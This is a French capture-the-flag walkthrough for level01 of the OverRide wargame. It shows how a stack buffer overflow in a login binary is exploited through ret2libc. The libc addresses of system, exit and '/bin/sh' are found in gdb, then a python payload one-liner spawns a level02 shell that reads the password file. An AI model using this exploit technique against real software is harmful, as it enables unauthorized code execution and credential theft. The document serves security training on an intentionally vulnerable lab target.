# Walkthrough — Level01 (OverRide)

## 🎯 Objectif

Exploiter une vulnérabilité de type **buffer overflow** dans `level01` pour exécuter `system("/bin/sh")` via un **ret2libc**, et obtenir un shell sous `level02`.

---

## 🔍 Étapes d’analyse

### 1. Lancement du binaire

```bash
$ ./level01
********* ADMIN LOGIN PROMPT *********
Enter Username: coucou
verifying username....
nope, incorrect username...
```

---

### 2. Analyse de `verify_user_name`

Le code assembleur montre une comparaison manuelle entre `a_user_name` et `"dat_wil"` sur 7 caractères.

✅ Le bon login est donc :

```
dat_wil
```

---

### 3. Analyse de `verify_user_pass`

La fonction compare le mot de passe avec `"admin"` sur 5 caractères mais le `main()` contient :

```c
if ((valid == 0) || (valid != 0)) {
    puts("nope, incorrect password...");
}
```

➡️ Même le bon mot de passe est **rejeté systématiquement**.

---

### 4. Analyse de la faille (overflow)

Dans `main` :

```c
char local_54[64];
fgets(local_54, 100, stdin); // 💥 buffer overflow
```

➡️ Le buffer de 64 octets est rempli avec jusqu’à 100 octets ➜ **débordement de pile**.

---

### 5. Trouver l’offset pour écraser EIP


En entrant 100 caractères comme mot de passe, on déclenche un crash.

Avec un pattern ou un script, on trouve :

```
./level01
Enter Username: dat_wil
Enter Password: AAAAAAAAAAA... (80 caractères)
```


Offset = 80
```

---

### 6. Ret2libc — Préparation de l’exploitation

Rechercher les adresses :

#### `/bin/sh`
```gdb
find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
→ 0xf7f897ec
```

#### `system`
```gdb
info function system
→ 0xf7e6aed0
```

#### `exit`
```gdb
info function exit
→ 0xf7e5eb70
```

---

### 7. Construction du payload

Forme du payload :

```
dat_wil\n
[A * 80]
[adresse de system()]
[adresse de exit()]
[adresse de "/bin/sh"]
```

Exemple :

```bash
python -c 'print("dat_wil\n" + "A"*80 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7")' > /tmp/payload
```

---

### 8. Exploitation finale

```bash
cat /tmp/payload - | ./level01
$ whoami
level02
$ cat /home/users/level02/.pass
<le mot de passe du level02>
```

---

## ✅ Résumé

| Élément               | Valeur                      |
|------------------------|-----------------------------|
| Faille                 | Buffer overflow (stack)     |
| Buffer vulnérable      | `local_54` (64 octets)      |
| Taille lue             | 100 octets (`fgets`)        |
| Offset EIP             | 80                          |
| Technique              | ret2libc                    |
| Composants             | `system`, `exit`, `"/bin/sh"` |
| Élément NON vulnérable | `a_user_name` (global)      |
